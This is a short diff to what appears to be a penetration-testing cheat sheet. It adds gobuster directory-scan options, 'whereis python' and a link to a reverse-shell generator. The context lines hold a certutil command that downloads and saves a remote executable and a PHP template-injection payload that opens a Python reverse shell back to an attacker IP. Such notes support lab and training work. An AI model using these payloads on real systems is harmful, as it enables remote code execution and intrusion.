@@ -18,6 +18,8 @@ gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -t 5 -b 301
 
 gobuster dns -d megacorpone.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
 
+gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -x php,html,asp 
+
 ### CERTUTIL
 
 certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
@@ -132,4 +134,10 @@ Referer: http://192.168.194.101/
 
 {"template":"\n\npassthru(\"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"192.168.49.194\\\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\\\"/bin/bash\\\")'\");\n\n","vars":{}}
 
+
+#### Some commands
+
+whereis python
+
+https://www.revshells.com/
 
